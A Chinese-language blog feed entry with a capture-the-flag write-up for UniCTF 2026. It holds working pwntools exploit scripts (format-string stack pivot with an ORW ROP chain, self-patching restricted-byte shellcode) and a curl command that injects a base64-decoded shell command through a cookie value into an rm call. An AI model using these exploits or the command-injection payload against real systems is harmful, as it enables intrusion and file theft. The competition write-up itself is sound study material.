<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Auceptin&#39;s Blog</title>
  <icon>https://aucept.in/icon.png</icon>
  
  <link href="https://aucept.in/atom.xml" rel="self"/>
  
  <link href="https://aucept.in/"/>
  <updated>2026-02-11T08:19:08.195Z</updated>
  <id>https://aucept.in/</id>
  
  <author>
    <name>Auceptin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  <follow_challenge><feedId>230229871042106368</feedId><userId>230228883350077440</userId></follow_challenge>
  
  <entry>
    <title>UniCTF 2026</title>
    <link href="https://aucept.in/2026/02/03/UniCTF/"/>
    <id>https://aucept.in/2026/02/03/UniCTF/</id>
    <published>2026-02-03T02:00:17.000Z</published>
    <updated>2026-02-11T08:19:08.195Z</updated>
    
    <content type="html"><![CDATA[<p>为期一周，中间夹杂着其他的事，做得蛮累的</p>
<h2 id="什么？我不是汇编高手吗？"><a href="#什么？我不是汇编高手吗？" class="headerlink" title="什么？我不是汇编高手吗？"></a>什么？我不是汇编高手吗？</h2><p>将输入指令以四字节为单位，用0xE9分割后执行</p>
<p>0xE9对应的汇编是短距离jmp，将后续四字节识别为偏移，然后跳转到rip + offset + 5的地址继续执行</p>
<p>精确计算的offset可以跳转到自定义四字节的开头，所以理论上可以任意不超过4字节汇编指令执行</p>
<p>没有PIE有后门函数，思路是将函数地址写入rax然后call rax，其中向rax写入地址需要拆成多步完成</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> payload
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> content

add<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x406a9090</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x58909090</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x9010e0c1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x12110566</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x9090d0ff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行时像这样：<br><pre class="line-numbers language-text" data-language="text"><code class="language-text">► 0x7c778587d000    jmp    0x7c778587d006              &lt;0x7c778587d006>
   ↓
  0x7c778587d006    nop
  0x7c778587d007    nop
  0x7c778587d008    push   0x40
  0x7c778587d00a    jmp    0x7c778587d010              &lt;0x7c778587d010>
   ↓
  0x7c778587d010    nop
  0x7c778587d011    nop
  0x7c778587d012    nop
  0x7c778587d013    pop    rax      RAX => 0x40
  0x7c778587d014    jmp    0x7c778587d01a              &lt;0x7c778587d01a>
   ↓
  0x7c778587d01a    shl    eax, 0x10
  0x7c778587d01d    nop
  0x7c778587d01e    jmp    0x7c778587d024              &lt;0x7c778587d024>
   ↓
  0x7c778587d024    add    ax, 0x1211     AX => 0x1211 (0x0 + 0x1211)
  0x7c778587d028    jmp    0x7c778587d02e              &lt;0x7c778587d02e>
   ↓
  0x7c778587d02e    call   rax                         &lt;getshell+27><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="Uni-check"><a href="#Uni-check" class="headerlink" title="Uni_check"></a>Uni_check</h2><p>一个go语言写的服务器，有两个功能，下载和检查</p>
<p>程序会在当前目录下存储cookie文件，可以自己指定内容（cookie文件名），检查功能会扫描文件内容是否合规，对于不合规的会执行删除，这里的逻辑是<br><code>delete_cmd = f&quot;rm -f &#123;self.base_dir&#125;/&#123;fname&#125;&quot;</code></p>
<p>删除指令是直接拼接的，于是通过<code>;``&amp;&amp;</code>一类的符号实现命令注入</p>
<p>还有go语言处理路径的问题，可以用<code>../</code>把文件写入上级目录</p>
<p>利用的思路是cat /flag到当前文件夹，然后下载下来的文件里就包含了flag，但是flag在根目录，有些字符如<code>/</code>是不能出现在文件名里的</p>
<p>最终的利用命令如下：<br><code>curl -v -b &quot;session=../test.txt&amp;&amp;echo Y2F0IC9mbGFnID4gZmxhZ19vdXQ=|base64 -d|sh;.txt&quot; http://nc1.ctfplus.cn:port</code></p>
<h2 id="speak"><a href="#speak" class="headerlink" title="speak"></a>speak</h2><p>沙箱环境的格式化字符串，前期比较正常一次泄露一次足够长的篡改，但是输出后直接用syscall退出，所以只好篡改printf的返回地址然后打orw</p>
<p>rop链是放在栈上的，需要利用一次栈迁移把返回地址改到rop链的开头，把返回地址放栈上，内容指向leave ret再改对应的rbp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">,</span> terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>
<span class="token comment">#p = process("./pwn")</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"nc1.ctfplus.cn"</span> <span class="token punctuation">,</span><span class="token number">23124</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"name:"</span><span class="token punctuation">)</span>

leak_payload <span class="token operator">=</span> <span class="token string">b"aaaabbbbccccddddeeeeffffgggghhhh%2$p %9$p %63$p?"</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>leak_payload<span class="token punctuation">)</span>

output <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"?"</span><span class="token punctuation">)</span>
cleaned <span class="token operator">=</span> output<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b"(nil)"</span><span class="token punctuation">,</span> <span class="token string">b"0x0"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b"? \n"</span><span class="token punctuation">)</span>
parts <span class="token operator">=</span> cleaned<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>

leaked_libc <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>parts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
leaked_stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
leaked_text <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>parts<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>

printf_ret <span class="token operator">=</span> leaked_stack <span class="token operator">-</span> <span class="token number">0x6B8</span> <span class="token operator">+</span> <span class="token number">0x5D8</span>
buffer_addr <span class="token operator">=</span> leaked_stack <span class="token operator">-</span> <span class="token number">0xc8</span>

libc_base <span class="token operator">=</span> leaked_libc <span class="token operator">-</span> <span class="token number">0x804643</span> <span class="token operator">+</span> <span class="token number">0x660100</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>
leaked_main <span class="token operator">=</span> leaked_text <span class="token operator">-</span> <span class="token number">0x7d60</span> <span class="token operator">+</span> <span class="token number">0x53dd</span>  
libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_base
elf_base <span class="token operator">=</span> leaked_main <span class="token operator">-</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span>
elf<span class="token punctuation">.</span>address <span class="token operator">=</span> elf_base
printf_addr <span class="token operator">=</span> leaked_main <span class="token operator">-</span> <span class="token number">0x3dd</span> <span class="token operator">+</span> <span class="token number">0x4af</span>
again_addr <span class="token operator">=</span> leaked_main <span class="token operator">-</span> <span class="token number">0x3dd</span> <span class="token operator">+</span> <span class="token number">0x496</span>

rop_libc <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
pop_rdi <span class="token operator">=</span> rop_libc<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"pop rdi"</span><span class="token punctuation">,</span> <span class="token string">"ret"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>address
pop_rsi <span class="token operator">=</span> rop_libc<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"pop rsi"</span><span class="token punctuation">,</span> <span class="token string">"ret"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>address
pop_rbp <span class="token operator">=</span> rop_libc<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"pop rbp"</span><span class="token punctuation">,</span> <span class="token string">"ret"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>address
pop_rdx_leave <span class="token operator">=</span> rop_libc<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"pop rdx"</span><span class="token punctuation">,</span> <span class="token string">"leave"</span><span class="token punctuation">,</span> <span class="token string">"ret"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>address

pop_rdx_g <span class="token operator">=</span> pop_rdx_leave
pop_rdx_extra <span class="token operator">=</span> <span class="token number">0x0</span> 
rop_elf <span class="token operator">=</span> ROP<span class="token punctuation">(</span>elf<span class="token punctuation">)</span>
leave_ret <span class="token operator">=</span> rop_elf<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"leave"</span><span class="token punctuation">,</span> <span class="token string">"ret"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>address

open_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"open"</span><span class="token punctuation">]</span>
read_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>
write_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>

bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x800</span>

rop_offset <span class="token operator">=</span> <span class="token number">0x60</span>
fake_rbp <span class="token operator">=</span> buffer_addr <span class="token operator">+</span> rop_offset <span class="token operator">-</span> <span class="token number">0x10</span>

writes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>printf_ret <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">:</span> p16<span class="token punctuation">(</span>fake_rbp <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">,</span> printf_ret<span class="token punctuation">:</span> p16<span class="token punctuation">(</span>leave_ret <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
fmt_payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> writes<span class="token punctuation">,</span> write_size<span class="token operator">=</span><span class="token string">"short"</span><span class="token punctuation">,</span> strategy<span class="token operator">=</span><span class="token string">"fast"</span><span class="token punctuation">)</span>
fmt_payload <span class="token operator">=</span> fmt_payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>rop_offset<span class="token punctuation">,</span> <span class="token string">b"A"</span><span class="token punctuation">)</span>

stage1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token comment">#buffer_addr + 0x50</span>
stage1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buffer_addr <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">0x28</span><span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token comment"># 执行到open时，rdx为0，不用设置，返回值（文件描述符为3）</span>
stage1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buffer_addr <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_leave<span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr <span class="token operator">+</span> <span class="token number">0x110</span><span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> <span class="token string">b"./flag\x00"</span>   <span class="token comment">#到0x100</span>


payload <span class="token operator">=</span> fmt_payload <span class="token operator">+</span> stage1
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x100</span><span class="token punctuation">:</span>
    <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"stage1 payload exceeds 0x100"</span><span class="token punctuation">)</span>

<span class="token comment">#gdb.attach(p)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"buffer addr</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>buffer_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>格式化字符串还是一如既往地繁琐</p>
<h2 id="smcode"><a href="#smcode" class="headerlink" title="smcode"></a>smcode</h2><p>任意输入执行，但是只能用斐波那契数列里的字节</p>
<p>光靠这些字节对应的指令肯定是无法getshell的，思路是借助al寄存器修改已写入的内容，动态构建出一些指令，最终来一个真正的任意读</p>
<p>GPT5.2给出了用于动态构建命令的神奇函数，由于是利用al完成所以如果拼出的指令对它有影响就会乱掉，好在本题只要触发read就好，可以手调</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">,</span> terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment">#p = process("./pwn")</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"nc1.ctfplus.cn"</span><span class="token punctuation">,</span><span class="token number">42376</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Input your shellcode"</span><span class="token punctuation">)</span>

ALLOWED <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">&#125;</span>
ALLOWED_ADD <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">]</span>

READ_N <span class="token operator">=</span> <span class="token number">0x59</span>

<span class="token keyword">def</span> <span class="token function">add_eax_imm8</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> v <span class="token keyword">in</span> ALLOWED
    <span class="token keyword">return</span> <span class="token string">b"\x05"</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00\x00\x00"</span>


<span class="token keyword">def</span> <span class="token function">reach_al</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>
    diff <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">-</span> cur<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span>
    seq <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> v <span class="token keyword">in</span> ALLOWED_ADD<span class="token punctuation">:</span>
        <span class="token keyword">while</span> diff <span class="token operator">>=</span> v<span class="token punctuation">:</span>
            seq<span class="token punctuation">.</span>append<span class="token punctuation">(</span>v<span class="token punctuation">)</span>
            diff <span class="token operator">-=</span> v
    out <span class="token operator">=</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>add_eax_imm8<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> seq<span class="token punctuation">)</span>
    <span class="token keyword">return</span> out<span class="token punctuation">,</span> target


<span class="token keyword">def</span> <span class="token function">patch_and_exec_base</span><span class="token punctuation">(</span>base<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> base <span class="token keyword">in</span> ALLOWED
    <span class="token keyword">return</span> <span class="token string">b"\x00\x05\x05\x00\x00\x00"</span> <span class="token operator">+</span> <span class="token string">b"\xE9\x00\x00\x00\x00"</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>base<span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">emit_exec_opcode</span><span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> opcode_byte<span class="token punctuation">,</span> follow<span class="token operator">=</span><span class="token string">b""</span><span class="token punctuation">,</span> base<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span> post_al<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    need_al <span class="token operator">=</span> <span class="token punctuation">(</span>opcode_byte <span class="token operator">-</span> base<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span>
    adj<span class="token punctuation">,</span> cur_al <span class="token operator">=</span> reach_al<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> need_al<span class="token punctuation">)</span>
    out <span class="token operator">=</span> adj <span class="token operator">+</span> patch_and_exec_base<span class="token punctuation">(</span>base<span class="token operator">=</span>base<span class="token punctuation">)</span> <span class="token operator">+</span> follow
    <span class="token keyword">if</span> post_al <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        cur_al <span class="token operator">=</span> post_al <span class="token operator">&amp;</span> <span class="token number">0xFF</span>
    <span class="token keyword">return</span> out<span class="token punctuation">,</span> cur_al


<span class="token keyword">def</span> <span class="token function">emit_push_imm8</span><span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> imm8<span class="token punctuation">)</span><span class="token punctuation">:</span>
    out<span class="token punctuation">,</span> cur_al <span class="token operator">=</span> emit_exec_opcode<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">)</span>
    out <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>imm8<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> out<span class="token punctuation">,</span> cur_al


<span class="token keyword">def</span> <span class="token function">emit_pop</span><span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> reg_pop_opcode<span class="token punctuation">,</span> post_al<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> emit_exec_opcode<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> reg_pop_opcode<span class="token punctuation">,</span> post_al<span class="token operator">=</span>post_al<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">pick_disp_at_least</span><span class="token punctuation">(</span>min_len<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cands <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> d <span class="token keyword">in</span> cands<span class="token punctuation">:</span>
        <span class="token keyword">if</span> d <span class="token operator">>=</span> min_len<span class="token punctuation">:</span>
            <span class="token keyword">return</span> d
    <span class="token keyword">return</span> <span class="token number">0xE9</span>


cur_al <span class="token operator">=</span> <span class="token number">0</span>
stage1 <span class="token operator">=</span> <span class="token string">b""</span>

<span class="token comment"># rsi = rbx</span>
chunk<span class="token punctuation">,</span> cur_al <span class="token operator">=</span> emit_exec_opcode<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">)</span>  <span class="token comment"># push rbx</span>
stage1 <span class="token operator">+=</span> chunk
chunk<span class="token punctuation">,</span> cur_al <span class="token operator">=</span> emit_exec_opcode<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">)</span>  <span class="token comment"># pop rsi</span>
stage1 <span class="token operator">+=</span> chunk

<span class="token comment"># rdx = READ_N (push imm8 会符号扩展，所以 imm8 必须 &lt; 0x80)</span>
chunk<span class="token punctuation">,</span> cur_al <span class="token operator">=</span> emit_push_imm8<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> READ_N<span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> chunk
chunk<span class="token punctuation">,</span> cur_al <span class="token operator">=</span> emit_pop<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">)</span>  <span class="token comment"># pop rdx</span>
stage1 <span class="token operator">+=</span> chunk

<span class="token comment"># 设置 AL=2，用于把后面的 0D patch 成 0F</span>
adj<span class="token punctuation">,</span> cur_al <span class="token operator">=</span> reach_al<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> adj

<span class="token comment"># 预计算：push 0; pop rax（pop rax 后 AL=0）</span>
late <span class="token operator">=</span> <span class="token string">b""</span>
late_chunk<span class="token punctuation">,</span> _ <span class="token operator">=</span> emit_push_imm8<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">)</span>
late <span class="token operator">+=</span> late_chunk
late_chunk<span class="token punctuation">,</span> _ <span class="token operator">=</span> emit_pop<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> post_al<span class="token operator">=</span><span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token comment"># rax有异，0x80刚好可以拼成pop rax</span>
late <span class="token operator">+=</span> late_chunk

<span class="token comment"># 选择一个允许的 disp，让 patch 指向 syscall 占位符的第一个字节</span>
<span class="token comment"># patch 指令长度 6，目标 = patch_next_rip + disp</span>
<span class="token comment"># 这里令 disp = padding + len(late)</span>
disp <span class="token operator">=</span> pick_disp_at_least<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>late<span class="token punctuation">)</span><span class="token punctuation">)</span>
padding <span class="token operator">=</span> disp <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>late<span class="token punctuation">)</span>

<span class="token comment"># add byte ptr [rip+disp], al  (disp32 = disp)</span>
stage1 <span class="token operator">+=</span> <span class="token string">b"\x00\x05"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>disp<span class="token punctuation">)</span>

<span class="token comment"># padding（不改寄存器）</span>
stage1 <span class="token operator">+=</span> <span class="token string">b"\x90"</span> <span class="token operator">*</span> padding

<span class="token comment"># rax=0，然后紧接着执行被 patch 的 syscall（read）</span>
stage1 <span class="token operator">+=</span> late

<span class="token comment"># syscall 占位符（会被上面的 patch 从 0d05 变成 0f05）</span>
stage1 <span class="token operator">+=</span> <span class="token string">b"\x0D\x05"</span>

<span class="token comment"># syscall 返回后：RAX == 实际读到的字节数（我们确保等于 READ_N）</span>
cur_al <span class="token operator">=</span> READ_N

<span class="token comment"># ret：栈顶在进入 shellcode 时就是 rbx，所以 ret 会跳到 rbx（stage2）</span>
chunk<span class="token punctuation">,</span> cur_al <span class="token operator">=</span> emit_exec_opcode<span class="token punctuation">(</span>cur_al<span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">)</span>
stage1 <span class="token operator">+=</span> chunk
<span class="token comment">#gdb.attach(p)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>stage1<span class="token punctuation">)</span>

